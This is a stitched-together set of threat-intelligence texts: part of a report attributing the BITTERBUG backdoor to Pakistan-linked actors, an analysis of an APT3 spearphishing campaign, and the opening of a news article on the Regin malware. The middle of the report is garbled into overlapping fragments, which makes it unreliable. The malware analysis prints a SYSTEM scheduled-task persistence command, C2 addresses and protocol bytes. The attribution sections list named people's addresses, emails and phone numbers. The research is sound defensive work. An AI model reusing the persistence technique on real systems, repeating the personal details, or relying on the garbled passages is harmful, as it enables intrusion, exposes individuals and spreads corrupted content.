from IP address 199.91.173.43.The hosting provider subsequently introduced5 TCIRT to their client VPNSOC, the customer
responsible for subleasing the IP address.Later that day, TCIRT received a response6 from support@vpsnoc.com providing
limited information on the server and related traffic (Figure 2).When TCIRT sent follow-up communications, VPSNOC did not
respond, further increasing our suspicions.This time zone usage is consistent with Pakistan’s time zone.7

The TCIRT published details of the initial activity in the aforementioned blog post on August 2, 2013.Four days later on August 6,
2013, the Tranchulas Chief Executive Officer, Zubair Khan, contacted us regarding the blog post and its subsequent press coverage.8
Khan submitted “Response_ThreatConnect.docx”9 as an explanation of the observed activity to both the media and the
TCIRT indicating that the debug paths using “Tranchulas” and “umairaziz27” was “done by developer of malware to portray
wrong impression about Tranchulas and mislead malware analysts”.Notably, Khan included a screenshot of an email message.The
message was reportedly a response from VPSNOC to an email message from Tranchulas sent on July 21, 2013, purportedly to notify
VPSNOC of the same malicious activity identified by TCIRT.However, we noted certain anomalies in this message.Figure 3: Screenshot (image1.png) included within Response_ThreatConnect.docx


As seen in Figure 3 the “email message” 10 was “sent” to VPSNOC from an unidentified tranchulas.com email address on “Tue,
Jul 21, 2013 at 11:36 PM.” July 21, 2013 was not a Tuesday and in fact was a Sunday.The mismatched date suggests that this
email message was potentially modified in order to support the claim that Tranchulas was aware of, and had already reported the
exploitation activity.TCIRT speculates that “Tuesday” was hastily chosen because our own official notification to VPSNOC was sent
on Wednesday the 24th.In addition, the “response” received by Tranchulas is nearly identical to that received by TCIRT.The TCIRT also requested that Mr. Khan share the actual email message with the
original attached headers.Mr. Khan did not address the TCIRT question, but rather deferred our request to Mr. Hamza Qamar,
a Penetration Testing Team Lead at Tranchulas.On August 15, 2013, three days later, Qamar responded to TCIRT with a brief
denial12 of any modifications to the screenshot (other than email address anonymization) and specifically referred TCIRT back to
VPSNOC support (support@vpsnoc.com) for any follow up questions.Astonished by this dismissal and deflection, TCIRT immediately began to explore the relationship between VPSNOC and Tranchulas.VPSNOC/Digital Linx/Tranchulas
During our research into VPSNOC, we identified that it is actually based in, or conducts partial operations from within, Pakistan.The company only gives the impression of operating from Kansas City through marketing and the use of leased IP space (Figure
4).The Whois records for vpsnoc.com revealed that the domain was registered by Digital Linx Hosting.Digital Linx is also a
Pakistan-based hosting company (Figure 5).The domain digitallinx.com is registered to Muhammad Naseer Bhatti (Digital Linx Founder)17 18 19 who uses email
addresses naseer@digitallinx.com and nbhatti@gmail.com.The domain is also registered to the address 638-F Johar
Town, Lahore Pakistan.20

The contact telephone number listed on Digital Linx’ web site is 925-665-1427 (Figure 6), and is also used in the WHOIS record
for defiantmarketing.com21.The domain defiantmarketing.com is registered to Abunasar Khan.The registration lists VPSNOC as the registrant organization,
abunasar@yahoo.com as the registration email address, and House 12, Street 21, F-8/1 Islamabad Federal 44000 as the
registration address.Abunasar Khan has been observed using the aliases “agnosticon” 22 and “agnostic”.Based on his
websites and account information, he appears to have an interest or participated in the Antisec26 and Anonymous27 movements
(Figure 8).He also used “anony mo us” in the registration name field of a personal account 28.In addition, Abunasar Khan’s Google+ profile revealed connections to at least one Tranchulas employee, Hamza Qamar29 and a
Digital Linx employee, Shoaib Riaz.30 31Hamza Qamar, the Team Lead for Penetration Testing at Tranchulas, with whom TCIRT last
spoke.32 Visiting Hamza Qamar’s Google+ page (Figure 9), the only directly connected person was Abunasar Khan.At this point, it
shows that a probable VPNSOC employee with ties or interests in hacking has an undefined but potentially close relationship with
Hamza Qamar, the Penetration Testing employee from Tranchulas.Tranchulas identifies
government (presumably Pakistan’s government) as an operational sector for its work.Tranchulas’ offensive cyber initiative
services are offered to “national-level cyber security programs” 33 34 indicating commercial demand from “national-level” customers.Though Tranchulas35 brands itself as a multi-national company, with respective addresses within the United Kingdom36, the United
States37, and New Zealand38.We found evidence that these addresses are all associated with either virtual office spaces or
address forwarding services.For further background information on these personas, please see Appendix F: Personas.The following is a summary of the relationships between the hosting organizations and Tranchulas:

•	 VPNSOC IP space was used as command and control nodes for attackers using variants of the BITTERBUG malware that
    contained build strings that referenced “Tranchulas” and a Tranchulas employee.•	 Tranchulas and VPNSOC were in direct communication at some point in July-August 2013.•	 VPNSOC is a subsidiary of Digital Linx.•	 Tranchulas, VPNSOC, Digital Linx were all physically located in Pakistan but maintained virtual presence within the U.S.

•	 Hamza Qamar was an employee of Tranchulas.•	 Abunasar Khan was affiliated with AntiSec and VPNSOC.•	 Digital Linx founder Muhammad Naseer Bhatti had at least a working relationship with VPNSOC employee Abunasar Khan39 –
    connected through domain registrations and a common Google+ profile for Shoaib Riaz (another Digital Linx employee).•	 VPNSOC employee Abunasar Khan had a direct connection to Tranchulas employee Hamza Qamar through Google+.Note: A walkthrough of our research is available in Appendices C, D and E.


Technical Observations
Metadata Analysis:

As mentioned earlier, during the email exchanged with Zubair Khan, he sent TCIRT a Microsoft Word document (.docx).In
reviewing the document metadata for “Response_ThreatConnect.docx “, TCIRT identified that it contained the creator
properties of “hp.” TCIRT compared the metadata of two benign BITTERBUG-associated decoy documents from July 2013 and
found that both also had the author of “hp” (Figure 10).Malware Analysis:

CyberSquared Inc. partnered with FireEye for a second technical review of the malware associated with this activity.FireEye
analyzed the malware,   which
              date.The	
      they call
                               earliest	
     BITTERBUG,
                                            samples	
           and determined
                                                        of	
  BITTERBUG	
      it to be
                                                                            contain	
   the	
   “Tranchulas”	
  
                                                                                          a custom   backdoor.These	
  Blaunch, and communications..egm, and .xml.These	
  
                                                                                                                             emorandum.overnment	
  
                                                      blogcomponents	
  
                                             upport	
                         pension	
  
                                                                     These BITTERBUG
                                                                            and	
           m  emorandum.Indian Government pensionreferences	
  
                             memorandum.to	
  “Cath”	
   in	
  the	
  
                                                 As stated       in thedebug	
   path.family.address from                         with	
  analysis.d istance	
   t    hem	
   f rom	
   p rior	
  
                  indicators.C:\Intel\Logs\file.pdb	
  

                                                                  Figure	
  11:	
  Generic	
  Debug	
  Path	
  
                  	
                                              Figure 11: Generic Debug Path
                  Between	
  December	
  2013	
  and	
  late	
  March	
  2014,	
  we	
  observed	
  several	
  new	
  lures	
  used	
  
                  in	
  BITTERBUG	
  self-­‐extracting	
  RAR	
  (SFXRAR)	
  files.One	
  from	
  December	
  contained	
  
Between December 2013 and late March 2014, we observed several new lures used in BITTERBUG self-extracting RAR (SFXRAR)
                  several	
  BITTERBUG	
  variants	
  and	
  used	
  a	
  decoy	
  PDF	
  document	
  (Figure	
  12)	
  related	
  to	
  
files.of DevyaniIn	
  spring	
  2014,	
  we	
  observed	
  a	
  SFXRAR	
  file	
  with	
  a	
  filename	
  lure	
  related	
  to	
  athe	
  
                                     Khobragade,       47
                                                             an Indian   diplomat      in   the United      States.related	
  
This SFXRAR contained           hijacking).which	
  Interestingly,
                                                                                                                                                                         had	
         this
                  new	
    d ependencies	
           o n	
   s upport	
   c omponents.I nterestingly,	
  
SFXRAR’s filename was the only lure element related to the MH370 event; it did not contain a decoy document.document.We	
  provide	
  a	
  more	
  detailed	
  report	
  on	
  this	
  SFX	
  and	
  the	
  related	
  variant	
  in	
  
                  Appendix	
  A:	
  Malware	
  Details.Figure 12: Screenshot of Indian diplomat arrest decoy PDF
                        47	
  http://world.time.com/2013/12/18/us-to-review-devyani-khobragade-arrest-and-strip-search/ 	
  
             48http://www.businessinsider.com/mh370-investigators-find-evidence-of-a-mysterious-power-
             outage-during-the-early-part-of-its-flight-2014-6	
  
BITTERBUG continued to rely on the same network behaviors to communicate with its C2s.Connections to its C2 nodes relied on
PHP and used communications that included “.php?compname=” and “.php?srs=”, as well as direct file/component retrieval
                                                                                                           	
  13	
  also
from the C2s.Though many of the samples that we have observed use direct IPs for HTTP communications, we have
observed more limited use of a No-IP domain.The threat actor appears to
have exclusively used VPSNOC, a probable Pakistan-based VPS service provider who leased U.S. hosting services, for both the
delivery and C2 phases of attack.Research later identified that a Pakistan-based VPSNOC representative had a social network
affiliation with a Tranchulas employee as well as apparent affiliations with the Anonymous and AntiSec movements.After the August 6, 2013 blog, Tranchulas provided TCIRT and the media an official statement and explanation of BITTERBUG
activity, however, this explanation contained discrepancies.The TCIRT addressed some of these discrepancies with Tranchulas
personnel, who were unresponsive, increasing our suspicion of the activity.We later observed BITTERBUG activity following
August 2013 with subtle changes that further generalized debug paths.It was this chain of events that served as a catalyst for
extra scrutiny of the activity and collaboration between the ThreatConnect and FireEye Labs teams to share information.While we are not conclusively attributing BITTERBUG activity to Tranchulas or a specific Pakistani entity, we can confidently point
to many characteristics of a Pakistan-based cyber exploitation effort that is probably directed against Indian targets or those who
are involved in India-Pakistan issues.Many of the notable characteristics of the BITTERBUG activity suggest that this is indeed
part of a Pakistan-based cyber exploitation effort that has apparently attempted to obfuscate its malware characteristics and
origins (behind U.S. infrastructure), before and after public disclosure in August 2013.On the surface, BITTERBUG serves as an example of how threat actors mask their operations across social, cultural and
geographic boundaries.More importantly, it demonstrates the value of threat intelligence sharing and industry collaboration.As
one organization begins to pull at a thread of evidence and share their findings with another, a larger understanding and shared
perspective is revealed.It is through this process that a shared awareness emerges into a larger, more comprehensive story that
explains what we are seeing and why - ultimately it is this story that better serves us all.11   •   OPERATION ARACHNOPHOBIA
APPENDIX
APPENDIX A: Malware Details
BITTERBUG
BITTERBUG is a backdoor executable capable of uploading and downloading files, listing running processes, generating file listings,
and automatically transferring selected files to its command and control (C2) server.BITTERBUG appears to be virtual machine aware
and may not execute on a VMWare or VirtualBox VM.We have observed BITTERBUG installed by a self-extracting RAR archive
disguised as a screensaver.Upon execution, the self-extracting RAR archive may extract configuration files, dependency DLLs, and
the BITTERBUG executable.The timeline below is of BITTERBUG activity from May 2013 through March 2014.The backdoor then may
enter an infinite sleep loop if recovery.txt contains either one of the aforementioned strings (Example in Figure 13).Figure 13: Example recovery.txt file from VMware virtual machine


Next BITTERBUG typically will beacon to the C2 server by sending the computer name and username of the compromised
system.An example beacon request is shown in Figure 14.The purpose of this command might be to delete older versions of BITTERBUG, although we have not observed this
command occurring in the wild.BITTERBUG then may attempt to download the files listed in Table 1.The purpose of the first three files is unknown.The final two
files are downloaded to the user’s Startup directory and executed at startup in order to maintain persistence.In one case, an actor
appeared to manually null out the “Cert-India” user directory in one of the file paths (see figures 15 and 16 below) contained in
two binaries (support components).These files shared the same import hash (4e96e86db5a8a025b996aefdc218ff74) and were
virtually the same files minus modification to a few bytes in the second sample.Figure 15: Original file content for 7588ff900e32145cbcbc77837237aef8




15   •    OPERATION ARACHNOPHOBIA
                                          Figure 16: Nulled file path for 26616e6662b390ebdb588cdaaae5e4f6


As these samples point to, we also observed use of the C++ Boost libraries, which introduced a new file path to monitor for
operational security purposes.We observed at least one case in which files mixed old and new file paths, as seen in the figures 17
and 18 below.Felement.s tring.A lternatively,	
        t hese	
   i nconsistencies	
          c ould	
   a lso	
     i ndicate	
  
                          sloppy	
  tradecraft	
  and/or	
  teamwork.49

Analysis of the VPSNOC email50 header indicated that the message was sent on Thursday 25 July at 02:28:41 +0500 GMT, which
is consistent with Pakistan’s time zone.Of note, the email message was sent with an X-Originating IP Address of 184.75.214.10
corresponding to a Private Internet Access51 Canadian proxy52.VPSNOC’s use of this commercial proxy service likely
demonstrates the intent to mask the apparent origin of the sender.These two examples highlight that VPSNOC’s inbound and outbound email communications consistently utilized a +0500
Pakistani timezone.In the following section we will examine the inconsistencies observed.Within the
response we observed the following inconsistencies:

Inconsistency #1: Day & Date Misalignment within image1.png Screenshot
Our review of the “Response_ThreatConnect.docx”53 focused in on the email screenshot (Figure 3) image1.png54 that Khan
provided revealing that the date probably had been modified to appear as though they were the first to notify VPSNOC.Within
the official response, Zubair Khan indicated that Tranchulas was “already aware of this incident...and contacted hosting
company.” The official response included a screenshot depicting an email sent to VPSNOC from an unidentified (redacted)
tranchulas.com email address that was sent on “Tue, Jul 21, 2013 at 11:36 PM” with no evidence of the date in which it was
received by or responded to by VPSNOC.This message contained a notable misalignment between the date and day of the week.July 21, 2013 was a Sunday, not a Tuesday.“Tuesday” would have pre-dated our official notification that occurred on Wednesday
July 24, 2013, and could indicate that Tranchulas may have obtained insight into the original TCIRT notification through Pakistan-
based contacts within VPSNOC.The TCIRT subsequently responded to Mr. Khan’s official explanation with a follow-up inquiry,
offering Khan an opportunity to explain the date inconsistency within the email screenshot.Mr. Khan deferred our request to
Mr. Hamza Qamar55, a Penetration Testing Team Lead at Tranchulas, who later responded56 with a simple denial that the email
message had not been altered apart from blurring the name of the original sender.Inconsistency #2: Awareness of Withheld Information
The email screenshot (image1.png) from within the Tranchulas response demonstrated awareness of information that we initially
withheld and later released in our blog post: one malware variant57 that contained a debug string with “umairaziz27” the
same username as a Tranchulas employee.The Tranchulas message to VPSNOC incorrectly claimed to identify malware on
199.91.173.43 that contained the “company’s name and...employee’s name”.While it is possible that Tranchulas’ analysts
discovered this variant independent of the blog post, it added to the inconsistent elements of the response and further suggested
that the blog post may have inspired its communications with VPSNOC.We note that we requested additional information such as
the “detailed analysis report” within the exchange from Tranchulas but did not receive a response.Inconsistency #3: Tranchulas Direct Notification
The Tranchulas response indicates that “Tranchulas’ research team was already aware of this incident before publication
of this report.Our team contacted hosting company of server to seek an explanation.” Considering there are no
public references to the identified infrastructure identifying VPSNOC as the “hosting company”.The only way for Tranchulas to
identify VPSNOC as the hosting company was to either have previous insider knowledge of the activity, or to have been privately
introduced by the Kansas-City-based service provider to their “client” VPSNOC, of which was never mentioned or discussed when
we initially exchanged with either the Kansas-City or Pakistan-based hosting providers.The only way to know that VPSNOC was subleasing the infrastructure was to obtain this information directly
from them.There was no public reference which would have revealed VPSNOC as the entity which maintained root access to the
199.91.173.43.Had Tranchulas legitimately conducted an initial victim notification sometime in late July 2013, they would have
likely done so through the Kansas-City-based hosting provider and not VPSNOC.On August 15, 2013, Hamza Qamar’s response to TCIRT’s follow up inquiry to the observed inconsistencies redirected TCIRT
personnel to VPSNOC to obtain an explanation versus attempting to explain the observed day date inconsistency and document
properties within the Tranchulas email.The TCIRT’s suspicion mounted when presenting Tranchulas with the opportunity to set the
record straight, that Tranchulas could not substantiate their claims, rather deferring the TCIRT inquiry to a third party (VPSNOC).Inconsistency #4: Tranchulas obtains similar response that TCIRT obtained
Within the “Response_ThreatConnect.docx“ the image “image1.png” contains an undated response from VPSNOC to the
“Tue, Jul 21, 2013” Tranchulas notification.The undated VPSNOC response that Tranchulas received is nearly identical to the
response that TCIRT and the Kansas-City-based service provider obtained on July 24th.Tranchulas does not include the date or
time as to when they obtained a response from VPSNOC.The TCIRT found it unusual that neither the Kansas-City-based service provider or VPSNOC personnel ever indicated either way
that they knew about the activity or had been previously contacted by either party.When considering all of the inconsistencies,
order of events and studying, Gmail webmail layout, similarities of keywords, salutations and closings within the “Tue, Jul 21,
2013” Tranchulas notification and the respective VPSNOC response.The TCIRT grew increasingly suspicious of the exchanges
with VPSNOC and subsequent exchanges with Tranchulas personnel.Inconsistency #5: Similar Document Metadata Properties
Analysis of metadata within two benign decoy documents that were originally used within July 2013 BITTERBUG operations,
Report.docx58 and Naxalites_Funded_by_Pakistan.docx59, both maintained the author properties of “hp”.58	       https://www.virustotal.com/en/file/7e940115988d64fbf7cd3b0d86cd2440529f921790578a96acac4c027120e0c5/analysis/
59	       https://www.virustotal.com/en/file/f689d9990a23fbde3b8688b30ff606da66021803390d0a48d02fad93dc11fa15/analysis/




22    •      OPERATION ARACHNOPHOBIA
APPENDIX E: VPSNOC & Digital Linx Associations
According to the vpsnoc.com website “In 2007 five VPS experts decided to invest in their very own private rack space in the heart
of Kansas, the United States.Their aim?To bring service-oriented, quality managed and unmanaged VPS solutions to clients
all over the world.Just 1 year later, after beginning their enterprise on 3 servers they had filled 2 server racks with happy clients
receiving quality U.S support.Their company continued to build momentum.” 60

Whois records for vpsnoc.com indicate that another individual registered the domain and listed Digital Linx Hosting as the registrant
organization with a Kansas City-based address, telephone number 925-665-1427, and administrative email address admin@digitallinx.org.61 This is the same registrant record for the digitallinx.net domain.62 The digitallinx.net/sitemap.xml63 and the corresponding Google
cache64 for digitallinx.net/sitemap.xml indiciate that both digitallinx.net and digitallinx.com have shared the same sitemap.xml at the same
time.The digitallinx.net/Contact.html65 identified similar overlaps with data across the .org, .net, and .com domains.The domain digitallinx.com is registered to Perasona #1.66 67 68 69 He uses email addresses naseer@digitallinx.com and nbhatti@
gmail.com as the domain registrant email address, along with address 638-F Johar Town, Lahore Pakistan and telephone
966.548805579.70 The DigitalLinx (digitallinx.com) website states that it is “a web hosting / Web Solutions & Processing
Outsourcing Company based in Pakistan”.Open source research of the phone number 925-665-1427 indicates that it is also used within site content as a phone number for
defiantmarketing.com.This domain is registered by Persona #2 71 who uses the aliases “agnosticon” and “agnostic”.Persona #2 lists VPSNOC
as the registrant organization, and uses the registration email address of abunasar@yahoo.com with an address of House 12, Street 21, F-8/1
Islamabad Federal 44000.The domain defiantmarketing.com domain has used ns1.abunasar.net and ns2.abunasar.net for name services.Within a January 2009 posting to a Debian users forum, Persona #2 sends an email from the abunasar@yahoo.com with a reply-to as
abunasar@army.com.72 Within the post, Persona #2 responds to the question “Who’s using Debian” listing DigitalLinx, Kansas City MO and
the link to digitallinx.com.Also, the seemingly abandoned Twitter profile for Persona #273 is only following the Twitter profile for @VPSNOC.74

In an April 2012 post to blackhatworld.com, a user with the alias “agnosticon” posted promotional codes for VPSNOC hosting
services, engaging with customers, providing them feedback regarding VPS services and thanking them for positive reviews.75
Within the posting the user “agnosticon” included an image which was an actual advertisement that was hosted at http://vpsnoc.com/order.png.76 77 Within the posted image it states “VPSNOC is a subdivision of Digital Linx Hosting.We have been in business since
2008”.Both Bhatti and Digital Linx are listed as the registrants for vbilling.org79, v-billing.com80, vgriffins.com81 and my-server.co82, which use P.O.Box 295658, Riyadh Saudi Arabia83 as the registration address.This
is also the address for two U.S. companies’ local operations.Bhatti is also listed as the owner of the netblock 46.4.139.224/28.Both passive DNS sources as well as Robtex84 highlight this overlapping infrastructure.85

From September 7 - 9, 2011, Tranchulas in cooperation with the Pakistan National University of Sciences and Technology86
(NUST), offered a Certified Penetration Testing Profession (CPTP) Workshop87 (Figure 17).During the workshop, basic penetration
techniques and skills were presented88.It is important to note that Muhammad Naseer Bhatti has been previously known to drop91 the family name “Bhatti”



90	       http://www.linkedin.com/groups/Tranchulas-Handson-Ethical-Hacking-Training-2616369.S.75237952
91	       https://groups.google.com/forum/#!original/securityfocus2/9325p2as3IU/BqKQJwdlZ4YJ




25    •      OPERATION ARACHNOPHOBIA
within online correspondence (Figure 18).In a June 2012 episode of Engineering and Technology Magazine92 podcast a Mohammed
Nasser, Penetration Tester at Tranchulas was interviewed93.A Mohammed Nasser may also be directly affiliated94 with Tranchulas.Figure 18: Muhammad Nasser Bhatti Dropping Family Name


This links Tranchulas to a Pakistani employee or consultant also named Muhammad Naseer.It is unknown if this is the same
Muhammad Naseer that is associated with VPSNOC’s parent company Digital Linx, the Pakistan-based service provider which
hosted the original BITTERBUG malware.92	       http://eandt.theiet.org/magazine/2012/06/
93	       http://eandt.theiet.org/magazine/2012/06/et-podcast-18.cfm
94	       http://www.zoominfo.com/s/#!search/profile/person?personId=1627460418&targetid=profile




26    •      OPERATION ARACHNOPHOBIA
Persona #2:
Abunasar Khan also maintains the aliases “agnosticon”95 and “agnostic”96 in addition to the email addresses abunasar@yahoo.com and abunasar@army.com.He has been previously associated97with VPSNOC & Digital Linx.An April 2012 Whois registrant
record for the domain zeusadnetwork.com98 includes the first and last name Khan along with the same (925) 665-1427 phone
number seen within the Digial Linx Hosting domains.Khan registered a variety of domains, many of which use his abunasar.net99 for name services and abunasar.yahoo.com within
the Start of Authority (SOA) records.For example a July 2014 record (Figure 19) for defiantmarketing.com100 and an August 2013
record (Figure 20) for ns2.vpsnoc.com both maintain these references.Get trusted.Trust nobody.Own everybody.Disclose
nothing.Destroy everything.In a September 2011 YouTube user “tranchulascert” posted a video titled “Tranchulas Cyber Ranges - P@sha ICT Awards
2011123”, where they awarded runner up124.Within the video, the cyber ranges were referenced as being developed for “defense
forces” that were aimed to “help them in developing offensive and defensive warfare skills” and “combating anti-state hackers”.Although Tranchulas125 brands itself as a multi-national company, their respective operating addresses within United Kingdom126
the United States127 and New Zealand128 are all associated with either virtual office spaces or address forwarding services.The
Tranchulas website lists its Pakistan address within the 2nd floor of the Evacuee Trust Complex129 on Sir Agha Khan Road F-5/1
Islamabad 44000.The Evacuee Trust Complex is also known as Software Technology Park 2130 or STP2 and hosts a variety131 of
other commercial and government offices.The Tranchulas employee, Hamza Qamar, that handled the response to our inquiry has a public LinkedIn132 profile that states that
he “Engaged in system and enterprise level network and Web application security testing for clients ranging from large federal
agencies, DoD, and commercial clients.” The profile does not specify if DoD is a reference to the U.S. Department of Defense or
another country’s Ministry of Defense.Interestingly, Qamar’s Google+ page showed one “friend” in his circle despite more than 40
followers, Abunasar Khan a VPSNOC employee.It is likely that Tranchulas provides services to the Pakistani government.The offensive cyber initiative services offered by
Tranchulas is offered to “national-level cyber security programs” suggesting a commercial demand from “national-level” customers.The stated purpose and intent of the Tranchulas “Cyber Ranges” P@sha ICT 2011 awards video suggests the ranges were
specifically developed in support of national interests for offensive and defensive purposes.The domain registration by Zubair
Khan using an official Pakistani government address with his zubair@tranchulas.com email address indicates that Khan may have
or currently maintains a physical address at a location where other Pakistani government officials reside.Historic Whois registration records for the domains textcrypter.com133, taggnation.com134, bookadoconline.com135 and saadiakhan.net136 lists Tranchulas CEO Zubair Khan (zubair@tranchulas.com137) as the registrant for the domains.At the time of registration
Khan used the address 15-B, Mehran Block of the Gulshan-e-Jinnah F-5/1 Islamabad Pakistan for the domains.Later in May of 2010 within a
Pakistani Senate139 question and answer session, the Gulshan-e-Jinnah Complex was cited under Federal Lodges / Hostels in
Islamabad under the control of Pakistan Ministry for Housing and Works.A December 2010 TheNews Pakistan ran a story140
that detailed the differential in rents between commoners within Islamabad and Pakistani government officers accommodated
at Gulshan-e-Jinnah.According to Google Maps141 it is approximately 650 meters (8 minute walk) from the Gulshan-e-Jinnah
Complex to the Tranchulas offices within the Evacuee Trust Complex.Within a May 2013 interview142 Khan specified that he comes from a family with a strong military background.He detailed his
interest in “the world of hacking” grew during his teen years, referencing his father’s diplomatic assignment to the Philippines in
2003.Khan would go on to establish Tranchulas in February 2006 after an independent audit of Pakistani Governments National
Database and Registration Authority (NADRA).32   •   OPERATION ARACHNOPHOBIA
Digital Appendix 2: Raw Email Communications
Digital Appendix 2 contains raw email communications.These .eml files include raw SMTP headers, content and attachments.33   •   OPERATION ARACHNOPHOBIA
Digital Appendix 3: Screenshot Archives
Digital Appendix 3 contains screenshots of web content used to conduct analysis.34   •   OPERATION ARACHNOPHOBIA
Digital Appendix 4: Maltego Visualization
Digital Appendix 4 contains visualization files that depict relationships and contain metadata associated with our Operation
Arachnophobia research.35   •    OPERATION ARACHNOPHOBIAOperation Double Tap


APT3 (also known as UPS), the actors responsible for Operation Clandestine Fox has quietly continued to
send waves of spearphishing messages over the past few months.This actor initiated their most recent
campaign on November 19, 2014 targeting multiple organizations.The attacker leveraged multiple
exploits, targeting both CVE-2014-6332 and CVE-2014-4113.CVE-2014-6332 was disclosed publicly on
2014-11-11 and is a Windows OLE Automation Array Remote Code Execution vulnerability.CVE-2014-
4113 is a privilege escalation vulnerability that was disclosed publicly on 2014-10-14.The use of CVE-2014-6332 is notable, as it demonstrates that multiple classes of actors, both criminal and
APT alike, have now incorporated this exploit into their toolkits.Further, the use of both of these two
known vulnerabilities in tandem is notable for APT3.This actor is historically known for leveraging zero-
day vulnerabilities in widespread but infrequent phishing campaigns.The use of known exploits and more
frequent attacks may indicate both a shift in strategy and operational tempo for this group.The Spearphish

The body of the message is below:

One Month's Free Membership for The PLAYBOY ClUB 1080P HD VIDEOS 100,000 PHOTOS
4,000 MODELS Nude Celebrities,Playmates,Cybergirls & More!Click
hxxp://join.playboysplus.com/signup/ To Get a Free Plus Member Now & Never Miss Another Update.Your Member referrals must remain active.If anyone getting "Promotion not available" for 1 month free
membership, you might get the issue up to 48 hrs once your membership is expired and make sure to
Clear out cookies or use another browser or use another PC.The Downloader

After the exploit or script executes, the system downloads install.exe, which has the following metadata:

MD5           5a0c4e1925c76a959ab0588f683ab437

Size         46592 bytes

Compile Time 2014-11-19 08:55:10Z

Import Hash      6b8611f8148a6b51e37fd68e75b6a81c

The file install.exe attempts to write two files (doc.exe and test.exe) to the hard-coded path
“C:\Users\Public”, which fails on Windows XP because that path is not present by default.The first dropped file, doc.exe, contains the CVE-2014-4113 exploit and then attempts to execute test.exe
with the elevated privileges.install.exe:

  c:\Users\aa\Documents\Visual Studio 2008\Projects\MShell\Release             \MShell.pdb

doc.exe:

  c:\Users\aa\Documents\Visual Studio 2008\Projects\4113\Release               \4113.pdb

test.exe:

  C:\Users\aa\Documents\Visual Studio 2010\Projects\MyRat\Client\Client
\obj\x86\Release\Client.pdb

The most interesting PDB string is the “4113.pdb,” which appears to reference CVE-2014-4113.This CVE is
a local kernel vulnerability that, with successful exploitation, would give any user SYSTEM access on the
machine.The malware component, test.exe, uses the Windows command "cmd.exe" /C whoami” to verify it is
running with the elevated privileges of “System” and creates persistence by creating the following
scheduled task:

  schtasks /create /tn "mysc" /tr C:\Users\Public\test.exe /sc ONLOGON         /ru "System"

When executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port
1913.The malware sends the SOCKS5 connection request "05 01 00" and verifies the server response
starts with "05 00".The malware then requests a connection to 192.184.60.229 on TCP port 81 using the
command "05 01 00 01 c0 b8 3c e5 00 51" and verifies that the first two bytes from the server are "05 00"
(c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order).Once the connection to the server is established, the malware expects a message containing at least three
bytes from the server.These first three bytes are the command identifier.The deflated exe was a variant of the same downloader described above and
connected to 198.55.115.71 over port 1913 via SOCKS5 proxy.The secondary payload in that case was
detected as Backdoor.APT.CookieCutter (aka Pirpi) and also named newnotepad.exe (MD5
8849538ef1c3471640230605c2623c67) and connected to the known APT3 domains:

  inform.bedircati[.]com

  pn.lamb-site[.]com

  210.109.99.64
The 192.184.60.229 IP address seen in this current campaign also hosts securitywap[.]com – another
known domain referenced in our Operation Clandestine Fox blog.DOMAIN                    FIRST SEEN     LAST SEEN        IP ADDRESS
 securitywap.com           2014-11-17     2014-11-20       192.184.60.229
 www.securitywap.com       2014-11-17     2014-11-20       192.184.60.229

In addition, the join.playboysplus[.]com exploit and payload delivery site resolves to 104.151.248.173.This IP has hosted other domains used by APT3 in past campaigns:

 DOMAIN                     FIRST SEEN     LAST SEEN        IP ADDRESS
 join.playboysplus[.]com    2014-11-21     2014-11-21       104.151.248.173
 walterclean[.]com          2014-11-18     2014-11-20       104.151.248.173
 www.walterclean[.]com      2014-11-18     2014-11-20       104.151.248.173

As we discussed in our previous blog detailing previous APT3 activity, the walterclean[.]com served as a
Plugx/Kaba command and control server.Conclusion

Although APT3 is well known for employing zero-day exploits in their attacks, recent activity has
demonstrated that they will also attack targets with known exploits or social engineering.Since Operation Clandestine Fox, we have observed this actor execute multiple attacks that did not rely on
zero-day exploits.The combination of this sustained operational tempo and lack of zero-day
exploits may indicate that this group has changed strategy and has decided to attack more
frequently and does not have steady access to zero-day exploit code.No matter the strategy,
this actor has shown an ability to operate successfully.IOCs for this threat can be found here.SECRET MALWARE IN EUROPEAN UNION ATTACK LINKED TO U.S. AND BRITISH INTELLIGENCE




Complex malware known as Regin is the suspected technology behind sophisticated cyberattacks conducted by U.S. and British intelligence agencies on the
European Union and a Belgian telecommunications company, according to security industry sources and technical analysis conducted by The Intercept.Regin was found on infected internal computer systems and email servers at Belgacom, a partly state-owned Belgian phone and internet provider, following
reports last year that the company was targeted in a top-secret surveillance operation carried out by British spy agency Government Communications
Headquarters, industry sources told The Intercept.The malware, which steals data from infected systems and disguises itself as legitimate Microsoft software, has also been identified on the same European Union
computer systems that were targeted for surveillance by the National Security Agency.The hacking operations against Belgacom and the European Union were first revealed last year through documents leaked by NSA whistleblower Edward
Snowden.The specific malware used in the attacks has never been disclosed, however.The Regin malware, whose existence was first reported by the security firm Symantec on Sunday, is among the most sophisticated ever discovered by researchers.Symantec compared Regin to Stuxnet, a state-sponsored malware program developed by the U.S. and Israel to sabotage computers at an Iranian nuclear facility.Sources familiar with internal investigations at Belgacom and the European Union have confirmed to The Intercept that the Regin malware was found on their
systems after they were compromised, linking the spy tool to the secret GCHQ and NSA operations.Ronald Prins, a security expert whose company Fox IT was hired to remove the malware from Belgacom’s networks, told The Intercept that it was “the most
sophisticated malware” he had ever studied.“Having analyzed this malware and looked at the [previously published] Snowden documents,” Prins said, “I’m convinced Regin is used by British and American
intelligence services.”

A spokesman for Belgacom declined to comment specifically about the Regin revelations, but said that the company had shared “every element about the attack”
with a federal prosecutor in Belgium who is conducting a criminal investigation into the intrusion.“It’s impossible for us to comment on this,” said Jan Margot, a
spokesman for Belgacom.“It’s always been clear to us the malware was highly sophisticated, but ever since the clean-up this whole story belongs to the past for
us.”

In a hacking mission codenamed Operation Socialist, GCHQ gained access to Belgacom’s internal systems in 2010 by targeting engineers at the company.The
agency secretly installed so-called malware “implants” on the employees’ computers by sending their internet connection to a fake LinkedIn page.The malicious
LinkedIn page launched a malware attack, infecting the employees’ computers and giving the spies total control of their systems, allowing GCHQ to get deep
inside Belgacom’s networks to steal data.The implants allowed GCHQ to conduct surveillance of internal Belgacom company communications and gave British spies the ability to gather data from the
company’s network and customers, which include the European Commission, the European Parliament, and the European Council.The software implants used in
this case were part of the suite of malware now known as Regin.One of the keys to Regin is its stealth: To avoid detection and frustrate analysis, malware used in such operations frequently adhere to a modular design.This
involves the deployment of the malware in stages, making it more difficult to analyze and mitigating certain risks of being caught.Based on an analysis of the malware samples, Regin appears to have been developed over the course of more than a decade; The Intercept has identified traces of
